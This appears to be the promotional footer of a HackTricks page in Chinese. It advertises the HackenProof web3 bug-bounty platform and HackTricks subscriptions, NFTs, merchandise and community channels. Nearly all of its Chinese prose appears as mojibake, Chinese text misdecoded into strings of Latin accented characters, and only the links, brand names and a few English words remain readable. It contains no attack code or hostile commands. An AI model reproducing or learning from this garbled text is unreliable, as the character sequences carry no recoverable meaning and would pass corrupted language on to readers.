**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¶ä»£æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶ç™»ä¸Šæ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
